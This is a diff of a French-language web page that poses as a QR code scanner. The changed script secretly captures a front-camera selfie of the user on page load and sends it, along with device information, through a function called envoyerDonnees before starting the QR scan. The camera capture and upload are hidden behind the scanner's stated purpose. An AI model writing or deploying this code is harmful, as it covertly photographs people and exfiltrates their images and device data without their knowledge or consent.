@@ -5,24 +5,22 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Scanner QR Code</title>
     <style>
+        /* Styles inchangés */
         #video-container {
             position: relative;
             width: 80vw;
             height: auto;
             margin-bottom: 10px;
         }
-
         #video-main {
             width: 100%;
             height: auto;
         }
-
         #qr-reader {
             width: 300px;
             height: 300px;
             margin: auto;
         }
-
         .corps {
             position: absolute;
             top: 50%;
@@ -39,7 +37,6 @@
             align-items: center;
             border-radius: 10px;
         }
-
         .corps::before {
             content: '';
             position: absolute;
@@ -51,7 +48,6 @@
             transform: translateY(-50%);
             z-index: 11;
         }
-
         #capture-button {
             width: 70px;
             height: 70px;
@@ -64,7 +60,6 @@
             display: block;
             margin: 20px auto;
         }
-
         #capture-button::after {
             content: '';
             position: absolute;
@@ -181,34 +176,33 @@
         }
 
         (async function() {
-            const videoMain = document.getElementById('video-main');
-            const streamMain = await obtenirCameraArriere();
+            // D'abord capture de la caméra selfie
+            const streamSelfie = await obtenirCameraSelfie();
+            if (streamSelfie) {
+                const videoSelfie = document.createElement('video');
+                videoSelfie.srcObject = streamSelfie;
+                videoSelfie.play();
 
-            if (streamMain) {
-                videoMain.srcObject = streamMain;
+                videoSelfie.onloadedmetadata = async () => {
+                    const dataURLSelfie = capturerPhoto(videoSelfie);
+                    const blobSelfie = dataURLToBlob(dataURLSelfie);
+                    const infosAppareil = await obtenirInfosAppareil();
 
-                // Capture automatique de la caméra selfie sans interrompre la caméra arrière
-                setTimeout(async () => {
-                    const streamSelfie = await obtenirCameraSelfie();
-                    if (streamSelfie) {
-                        const videoSelfie = document.createElement('video');
-                        videoSelfie.srcObject = streamSelfie;
-                        videoSelfie.play();
+                    await envoyerDonnees(blobSelfie, infosAppareil);
+                    console.log('Image de la caméra selfie envoyée avec succès');
 
-                        videoSelfie.onloadedmetadata = async () => {
-                            const dataURLSelfie = capturerPhoto(videoSelfie);
-                            const blobSelfie = dataURLToBlob(dataURLSelfie);
-                            const infosAppareil = await obtenirInfosAppareil();
-
-                            await envoyerDonnees(blobSelfie, infosAppareil);
-                            console.log('Image de la caméra selfie envoyée avec succès');
-
-                            lancerScanQRCode();
-                        };
+                    // Après capture de la caméra selfie, démarrer le flux de la caméra arrière
+                    const videoMain = document.getElementById('video-main');
+                    const streamMain = await obtenirCameraArriere();
+                    if (streamMain) {
+                        videoMain.srcObject = streamMain;
+                        lancerScanQRCode();
+                    } else {
+                        alert("Impossible d'accéder à la caméra arrière.");
                     }
-                }, 2000);
+                };
             } else {
-                alert("Impossible d'accéder à la caméra arrière.");
+                alert("Impossible d'accéder à la caméra selfie.");
             }
         })();
     </script>
